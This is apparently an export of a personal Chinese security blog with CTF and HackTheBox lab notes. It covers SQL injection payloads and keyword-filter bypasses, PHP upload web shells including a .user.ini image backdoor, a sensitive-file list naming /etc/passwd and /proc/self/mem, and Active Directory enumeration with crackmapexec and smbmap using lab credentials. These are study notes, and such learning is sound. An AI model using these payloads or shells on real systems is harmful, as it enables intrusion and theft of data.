        <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a href="https://blog.csdn.net/l2872253606/article/details/123362430">【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>show databases</p><p>show tables</p><p>当纯数字字符串是表名的时候需要加反引号:</p><p>show columns from `1919810931114514`</p><p>反引号表示内容为表明</p><h2 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h2><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明_mysql handler-CSDN博客</a></p><h5 id="1、打开句柄"><a href="#1、打开句柄" class="headerlink" title="1、打开句柄"></a>1、打开句柄</h5><pre><code class="mysql">handler handler_table open;#这里可以使用别名</code></pre><h5 id="2、查看数据"><a href="#2、查看数据" class="headerlink" title="2、查看数据"></a>2、查看数据</h5><pre><code class="mysql">handler handler_table read first;handler handler_table read next;</code></pre><p>payload:</p><pre><code>1&#39;;use supersqli;handler `1919810931114514` open as p;handler p read first;</code></pre><h2 id="预编译绕过法"><a href="#预编译绕过法" class="headerlink" title="预编译绕过法"></a>预编译绕过法</h2><p><a href="https://blog.csdn.net/bb15070047748/article/details/107266400">什么是MySQL的预编译？_mysql 预编译-CSDN博客</a></p><pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct flag from `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;#</code></pre><p>感觉像是set设置变量值然后在语句中替换，使用concat绕过关键字过滤</p><h2 id="修改原查询法"><a href="#修改原查询法" class="headerlink" title="修改原查询法"></a>修改原查询法</h2><p>如果没有过滤alter，把默认展示的字段名字修改，把想看的字段名字、表明等修改为默认展示的名字</p><p>将放着flag的表1919810931114514名字改成words</p><p>alter table <code>1919810931114514</code> rename to words</p><p>表里头字段名flag改成id</p><p>alter table words change flag id varchar(100)</p><ul><li><p><code>ALTER TABLE words</code> 表示您要修改的表是名为 <code>words</code> 的表。</p></li><li><pre><code>CHANGE flag id varchar(100)</code></pre><p> 是实际的修改部分。它的含义是：</p><ul><li><code>CHANGE</code> 表示您要更改一个列的属性。</li><li><code>flag</code> 是要更改的列的当前名称。</li><li><code>id</code> 是要将该列更改为的新名称。</li><li><code>varchar(100)</code> 是新的数据类型，将该列更改为 VARCHAR 类型，最大长度为 100 个字符。</li></ul></li></ul><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul><li>strstr函数不区分大小写，所以我们可以改一下大小写来绕过strstr函数</li><li>过滤了union select，我们用union all select 就可以绕过</li></ul><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p><a href="https://blog.csdn.net/m0_63525319/article/details/127982141">sql中的无关子查询与相关子查询和集合查询详细举例说明_无关子查询和相关子查询_ctf^_^的博客-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311030020659.png" alt="image-20231103001841549"></p><p>相当于临时新建了一个a表，username字段放入admin，password字段放入123，用来绕过其后的验证：</p><pre><code>query (&quot;select username,password from &quot;.$this-&gt;table.&quot; where username=&#39;&quot;.$this-&gt;username.&quot;&#39; and password=&#39;&quot;.$this-&gt;password.&quot;&#39;&quot;);</code></pre><h1 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h1><p><a href="https://blog.csdn.net/yuanxu8877/article/details/128071631">【精选】攻防世界easyupload （web新手）_sean7777777的博客-CSDN博客</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&lt;?= eval($_POST[1]);?&gt;&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;php://filter/convert.iconv.UTF-7.UCS-4*/resource=xxx.php</code></pre><h2 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h2><ul><li>&#x2F;etc&#x2F;passwd</li><li><code>/proc/self/cmdline</code>，用于获取当前启动进程的完整命令。</li><li>&#x2F;proc&#x2F;self&#x2F;maps获取堆栈分布</li><li>&#x2F;proc&#x2F;self&#x2F;mem得到进程的内存内容</li></ul><h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.<a href="https://so.csdn.net/so/search?q=ini%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">ini文件</a></h2><p>具体参考<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p><p>.user.ini</p><pre><code>auto_prepend_file=a.jpg</code></pre><p>a.jpg</p><pre><code>GIF89a&lt;?php eval($_P0ST[&#39;a&#39;]); ?&gt;</code></pre><h2 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h2><p>利用了一个Linux的目录结构特性 , 请看下面代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190907181102.png" alt="20190907181102.png"></p><p>这里访问 <code>./1.php/2.php/..</code> 代表访问 <code>2.php</code>的父目录 , 也就是访问 <code>1.php</code> 。</p><p>因此这里构造数据包时 , 可以构造如下POST数据</p><pre><code>con=&lt;?php @eval($_POST[cmd]);?&gt;&amp;file=test.php/1.php/..</code></pre><h1 id="php相关"><a href="#php相关" class="headerlink" title="php相关"></a>php相关</h1><h2 id="RCE-变量动态调用函数"><a href="#RCE-变量动态调用函数" class="headerlink" title="RCE-变量动态调用函数"></a>RCE-变量动态调用函数</h2><p>[buuctf-<a href="https://blog.csdn.net/xhy18634297976/article/details/123148026">CISCN 2019 初赛]Love Math（小宇特详解）_小宇特详解的博客-CSDN博客</a></p><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</p><pre><code>$a=&#39;system&#39;;$a(&#39;cat/flag&#39;);payload:?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</code></pre><h3 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h3><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><p><a href="https://coding.tools/cn/ascii-to-hex">ASCII字符串到16进制在线转换工具 - Coding.Tools</a></p><h3 id="base-convert-函数"><a href="#base-convert-函数" class="headerlink" title="base_convert()函数"></a>base_convert()函数</h3><p>base_convert()函数能够在任意进制之间转换数字</p><p>hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</p><p>hex2bin&#x3D;base_convert(37907361743,10,36)</p><h3 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex()函数"></a>dechex()函数</h3><p>dechex()函数将10进制数转换为16进制的数</p><p><a href="https://www.sojson.com/hexconvert/16to10.html">十六进制转十进制| 16进制转10进制 | 在线进制转换工具 (sojson.com)</a></p><h2 id="RCE-preg-replace"><a href="#RCE-preg-replace" class="headerlink" title="RCE-preg_replace"></a>RCE-preg_replace</h2><p><a href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p><p>1.&#x2F;e修饰符必不可少<br>2.你必须让 subject 中有 pattern 的匹配。<br>3.可能跟php版本有关系,受用条件也只限于5.5到5.6的php版本<br>4.满足可变变量的条件</p><h2 id="反序列化-POP-chains"><a href="#反序列化-POP-chains" class="headerlink" title="反序列化 POP chains"></a>反序列化 POP chains</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231110111419036.png" alt="image-20231110111419036"></p><p><a href="https://blog.csdn.net/cosmoslin/article/details/120297881">【精选】php反序列化—POP 链的构造利用_反序列化pop链-CSDN博客</a></p><p><a href="https://www.php.net/manual/zh/function.popen.php">PHP: popen - Manual</a></p><pre><code>popen(string $command, string $mode): resource|false</code></pre><p>返回一个和 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 <a href="https://www.php.net/manual/zh/function.pclose.php">pclose()</a> 来关闭。此指针可以用于 <a href="https://www.php.net/manual/zh/function.fgets.php">fgets()</a>，<a href="https://www.php.net/manual/zh/function.fgetss.php">fgetss()</a> 和 <a href="https://www.php.net/manual/zh/function.fwrite.php">fwrite()</a>。 当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。</p><pre><code>&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt;</code></pre><p><a href="https://www.cnblogs.com/gaohj/p/3267692.html">PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec() - gaohj - 博客园 (cnblogs.com)</a></p><pre><code>function passthru(string $command,int[optional] $return_value)</code></pre><p>passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p><pre><code>&lt;?php        passthru(&quot;ls&quot;);?&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows_Privilege_Escalation</title>
      <link href="/2023/10/24/Windows-Privilege-Escalation/"/>
      <url>/2023/10/24/Windows-Privilege-Escalation/</url>
      
        <content type="html"><![CDATA[<h1 id="信息枚举"><a href="#信息枚举" class="headerlink" title="信息枚举"></a>信息枚举</h1><h2 id="查看arp缓存"><a href="#查看arp缓存" class="headerlink" title="查看arp缓存"></a>查看arp缓存</h2><pre><code>arp -a</code></pre><h2 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h2><pre><code>route print</code></pre><h2 id="powershell-查看Windows-Defender-状态"><a href="#powershell-查看Windows-Defender-状态" class="headerlink" title="powershell:查看Windows Defender 状态"></a>powershell:查看Windows Defender 状态</h2><pre><code>Get-MpComputerStatus</code></pre><h2 id="ps-列出应用锁程序规则"><a href="#ps-列出应用锁程序规则" class="headerlink" title="ps:列出应用锁程序规则"></a>ps:列出应用锁程序规则</h2><pre><code class="powershell-session">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></pre><h2 id="测试AppLocker策略"><a href="#测试AppLocker策略" class="headerlink" title="测试AppLocker策略"></a>测试AppLocker策略</h2><pre><code class="powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User EveryoneFilePath                    PolicyDecision MatchingRule--------                    -------------- ------------C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab_pass</title>
      <link href="/2023/10/20/sqli-lab-pass/"/>
      <url>/2023/10/20/sqli-lab-pass/</url>
      
        <content type="html"><![CDATA[<p><a href="https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/">从0到1完全掌握 SQL 注入 | Drunkbaby’s Blog (drun1baby.top)</a></p><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information schema"></a>information schema</h1><p><a href="https://www.pianshen.com/article/3739146098/">mysql中information_schema说明 - 程序员大本营 (pianshen.com)</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803755.png" alt="image-20231020172620307"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803757.png" alt="image-20231020172716074"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803758.png" alt="image-20231020172740361"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803760.png" alt="image-20231020172751913"></p><p><a href="https://blog.csdn.net/cplvfx/article/details/108292814">information_schema.columns字段说明，获取数据库表所有列信息-CSDN博客</a></p><h1 id="mysql中的连接函数"><a href="#mysql中的连接函数" class="headerlink" title="mysql中的连接函数"></a>mysql中的连接函数</h1><p><a href="https://blog.csdn.net/qq_34292479/article/details/86500185">详解MySQL中CONCAT()函数的用法（链接字符串）_mysql concat-CSDN博客</a></p><p><a href="https://blog.csdn.net/liu_feng_zi_/article/details/106863688">SQL学习笔记——limit用法（limit使用一个参数，limit使用两个参数）_limit参数-CSDN博客</a></p><h1 id="SUBSTR-、Ascii"><a href="#SUBSTR-、Ascii" class="headerlink" title="SUBSTR()、Ascii()"></a>SUBSTR()、Ascii()</h1><p><a href="https://zhuanlan.zhihu.com/p/110142732">MySQL|SUBSTR() 函数用法 - 知乎 (zhihu.com)</a></p><p><a href="https://www.yiibai.com/sqlserver/sql-server-ascii-function.html">SQL Server Ascii()函数 - SQL Server教程 (yiibai.com)</a></p><h1 id="extractvalue-、updatexml-、floor-报错注入"><a href="#extractvalue-、updatexml-、floor-报错注入" class="headerlink" title="extractvalue()、updatexml()、floor()报错注入"></a>extractvalue()、updatexml()、floor()报错注入</h1><p><a href="https://blog.csdn.net/weixin_46145442/article/details/110254238">sql注入中报错注入函数extractvalue和updatexml函数的原理及使用-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_46634468/article/details/120692475">【精选】SQL报错型注入原理-详细讲解 extractvalue()、updatexml()、floor() 的报错原因-CSDN博客</a></p><p>如果<code>extractvalue()</code>爆出的字段数不够，在条件中加入not来去除已经查询到的数据，然后显示未查询到的</p><p>such as：</p><pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;user&#39;,&#39;avatar&#39;,&#39;last_login&#39;,&#39;failed_login&#39;)))) --+</code></pre><p><code>extractvalue()</code>第二个参数似乎只能注入<code>concat()</code>（-笔者目前所知），但是<code>concat()</code>的参数可以嵌套<code>group_concat()</code>:</p><pre><code>127.0.0.1/Less-5/?id=1&#39;%20 union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p>也可已使用用<code>substring()</code>函数截取</p><pre><code>select (extractvalue(1,concat(0x7e,substring(hex((select database())),1,32))));</code></pre><p>经过测试，<code>updatexml()</code>也是可以和上面这样的嵌套</p><pre><code>http://127.0.0.1/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username)%20from%20users%20where%20username%20not%20in%20(%22Angelina%22,%22Dummy%22,%22secure,stup%22)),0x7e),1)%20--+</code></pre><p>同样的情况下，应该可以使用<code>floor()</code>(但是根据上方博客的测试内容，rand()产生的伪随机数列011011001，需要运行到第三次产生异常导致报错，所以笔者预估需要数据库中至少三个数据才能使用floor()报错注入):</p><pre><code>“select * from users where id=‘1’ and ( select 1 from ( select count(),concat( ( select schema_name from information_schema.schemata limit 0,1 ), floor( rand( 0 )2 ) ) x from information_schema.schemata group by x ) b ) --+ ’ LIMIT 0,1”</code></pre><h1 id="left-、right"><a href="#left-、right" class="headerlink" title="left()、right()"></a>left()、right()</h1><p><a href="https://blog.csdn.net/m0_69860228/article/details/124897306">SQL中常用的字符串LEFT函数和RIGHT函数详解_数据库left_Java架构狮的博客-CSDN博客</a></p><h1 id="limit和offset"><a href="#limit和offset" class="headerlink" title="limit和offset"></a>limit和offset</h1><p><a href="https://zhuanlan.zhihu.com/p/116007156">MYSQL|limit和offset用法 - 知乎 (zhihu.com)</a></p><h1 id="outfile"><a href="#outfile" class="headerlink" title="outfile"></a>outfile</h1><p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">MySQL讲义第 36 讲——select 查询之 INTO OUTFILE参数_select into outfile-CSDN博客</a></p><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076">SQL注入中，注释#、 –+、 –%20、 %23到底是什么意思？sqli-labs-master-CSDN博客</a></p><p>在get请求中使用<code>--+</code>而在post请求中使用<code>#</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> sqli-lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD-3</title>
      <link href="/2023/10/02/AD-3/"/>
      <url>/2023/10/02/AD-3/</url>
      
        <content type="html"><![CDATA[<ul><li>Deeper Down the Rabbit Hole<ul><li>认证枚举</li></ul></li><li>Cooking with Fire</li></ul><span id="more"></span><h1 id="Credentialed-Enumeration-from-Linux"><a href="#Credentialed-Enumeration-from-Linux" class="headerlink" title="Credentialed Enumeration - from Linux"></a>Credentialed Enumeration - from Linux</h1><h4 id="CME-Domain-User-Enumeration"><a href="#CME-Domain-User-Enumeration" class="headerlink" title="CME - Domain User Enumeration"></a>CME - Domain User Enumeration</h4><p>我们首先将CME指向域控制器，并使用第二个用户的凭据来检索所有域用户的列表。请注意，当它向我们提供用户信息时，它包括诸如badPwdCount属性之类的数据点。这在执行有针对性的密码喷洒等操作时很有帮助。我们可以构建一个目标用户列表，过滤掉badPwdCount属性高于0的任何用户，以格外小心，不要锁定任何帐户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --usersSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395&lt;SNIP&gt;</code></pre><p>我们还可以获得域组的完整列表。我们应该将所有输出保存到文件中，以便以后再次轻松访问，以便进行报告或与其他工具一起使用。</p><h4 id="CME-Domain-Group-Enumeration"><a href="#CME-Domain-Group-Enumeration" class="headerlink" title="CME - Domain Group Enumeration"></a>CME - Domain Group Enumeration</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groupsSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0&lt;SNIP&gt;SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0&lt;SNIP&gt;SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36&lt;SNIP&gt;</code></pre><p>上面的代码段列出了域中的组以及每个组中的用户数。输出还显示域控制器上的内置组，例如Backup Operators。我们可以开始记下感兴趣的群体。请注意关键组，如管理员、域管理员、行政人员，以及可能包含特权IT管理员的任何组等。这些组可能包含具有提升权限的用户，值得在我们的评估中作为目标。</p><h4 id="CME-Logged-On-Users"><a href="#CME-Logged-On-Users" class="headerlink" title="CME - Logged On Users"></a>CME - Logged On Users</h4><p>我们也可以使用CME来瞄准其他主机。让我们检查一下似乎是文件服务器的内容，看看当前登录了哪些用户。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-usersSMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon usersSMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01&lt;SNIP&gt;</code></pre><p>我们看到许多用户登录到这个服务器，这非常有趣。我们还可以看到，我们的用户forend是本地管理员，因为（Pwn3d！）出现在工具成功验证到目标主机之后。像这样的主机可以被管理用户用作跳转主机或类似的主机。我们可以看到用户wley已经登录，我们之前将其标识为域管理员。如果我们可以从内存中窃取或模拟该用户的凭据，这可能是一场轻松的胜利。 正如我们稍后将看到的，BloodHound（以及PowerView等其他工具）可以用于查找用户会话。BloodHound功能特别强大，因为我们可以使用它以多种方式以图形方式快速查看域用户会话。无论如何，像CME这样的工具非常适合更有针对性的枚举和用户搜索。</p><h4 id="CME-Share-Searching"><a href="#CME-Share-Searching" class="headerlink" title="CME Share Searching"></a>CME Share Searching</h4><p>我们看到有几个共享可供我们使用READ访问。Department Shares<code>, </code>User Shares和ZZZ_archive共享值得进一步挖掘，因为它们可能包含密码或PII等敏感数据。接下来，我们可以深入挖掘共享，并在每个目录中搜寻文件。spider_plus模块将挖掘主机上的每个可读共享，并列出所有可读文件。让我们试一试。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share &#39;Department Shares&#39;SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [&#39;print$&#39;]SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [&#39;ico&#39;, &#39;lnk&#39;]SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus</code></pre><p>在上面的命令中，我们对Department Shares运行了spider。完成后，CME将结果写入位于&#x2F;tmp&#x2F;CME_spider_plus&#x2F;<ip-of-host>的JSON文件。下面我们可以看到JSON输出的一部分。我们可以四处寻找有趣的文件，例如web.config文件或可能包含密码的脚本。如果我们想进一步挖掘，我们可以提取这些文件来查看其中包含的内容，也许可以找到一些硬编码的凭据或其他敏感信息。</p><p>这只是对其能力的一个微小的观察；值得对实验室目标进行更多的实验。在本模块的剩余部分中，我们将以各种方式利用CME。让我们继续看SMBMap。</p><h2 id="SMBMap"><a href="#SMBMap" class="headerlink" title="SMBMap"></a>SMBMap</h2><p>SMBMap非常适合从Linux攻击主机枚举SMB共享。它可用于收集共享、权限和共享内容的列表（如果可以访问）。一旦获得访问权限，就可以用来下载和上传文件以及执行远程命令。 与CME一样，我们可以使用SMBMap和一组域用户凭据来检查远程系统上的可访问共享</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5[+] IP: 172.16.5.5:445Name: inlanefreight.local                                       Disk                                                  PermissionsComment    ----                                                  ------------------    ADMIN$                                            NO ACCESSRemote Admin    C$                                                NO ACCESSDefault share    Department Shares                                 READ ONLY    IPC$                                              READ ONLYRemote IPC    NETLOGON                                          READ ONLYLogon server share     SYSVOL                                            READ ONLYLogon server share     User Shares                                       READ ONLY    ZZZ_archive                                       READ ONLY</code></pre><p>以上内容将告诉我们我们的用户可以访问什么以及他们的权限级别。与CME的结果一样，我们看到用户forend无法通过ADMIN$或C$共享访问DC（这是标准用户帐户所期望的），但可以通过IPC$、NETLOGON和SYSVOL进行读取访问，这是任何域中的默认访问权限。其他非标准共享，如部门共享以及用户和归档共享，是最有趣的。让我们递归地列出Department Shares共享中的目录。正如预期的那样，我们可以看到公司中每个部门的子目录。</p><h4 id="Recursive-List-Of-All-Directories"><a href="#Recursive-List-Of-All-Directories" class="headerlink" title="Recursive List Of All Directories"></a>Recursive List Of All Directories</h4><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only[+] IP: 172.16.5.5:445Name: inlanefreight.local                                       Disk                                                  PermissionsComment    ----                                                  ------------------    Department Shares                                 READ ONLY    .\Department Shares\*    dr--r--r--                0 Thu Mar 31 15:34:29 2022.    dr--r--r--                0 Thu Mar 31 15:34:29 2022..    dr--r--r--                0 Thu Mar 31 15:14:48 2022Accounting    dr--r--r--                0 Thu Mar 31 15:14:39 2022Executives    dr--r--r--                0 Thu Mar 31 15:14:57 2022Finance    dr--r--r--                0 Thu Mar 31 15:15:04 2022HR    dr--r--r--                0 Thu Mar 31 15:15:21 2022IT    dr--r--r--                0 Thu Mar 31 15:15:29 2022Legal    dr--r--r--                0 Thu Mar 31 15:15:37 2022Marketing    dr--r--r--                0 Thu Mar 31 15:15:47 2022Operations    dr--r--r--                0 Thu Mar 31 15:15:58 2022R&amp;D    dr--r--r--                0 Thu Mar 31 15:16:10 2022Temp    dr--r--r--                0 Thu Mar 31 15:16:18 2022Warehouse    &lt;SNIP&gt;</code></pre><h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><pre><code class="bash">rpcclient -U &quot;&quot; -N 172.16.5.5</code></pre><h4 id="rpcclient-Enumeration"><a href="#rpcclient-Enumeration" class="headerlink" title="rpcclient Enumeration"></a>rpcclient Enumeration</h4><p>在rpcclient中查看用户时，您可能会注意到每个用户旁边都有一个名为rid:的字段。相对标识符（RID）是Windows用来跟踪和识别对象的唯一标识符（以十六进制格式表示）</p><h4 id="RPCClient-User-Enumeration-By-RID"><a href="#RPCClient-User-Enumeration-By-RID" class="headerlink" title="RPCClient User Enumeration By RID"></a>RPCClient User Enumeration By RID</h4><pre><code class="shell-session">rpcclient $&gt; queryuser 0x457        User Name   :   htb-student        Full Name   :   Htb Student        Home Drive  :        Dir Drive   :        Profile Path:        Logon Script:        Description :        Workstations:        Comment     :        Remote Dial :        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT        unknown_2[0..31]...        user_rid :      0x457        group_rid:      0x201        acb_info :      0x00000010        fields_present: 0x00ffffff        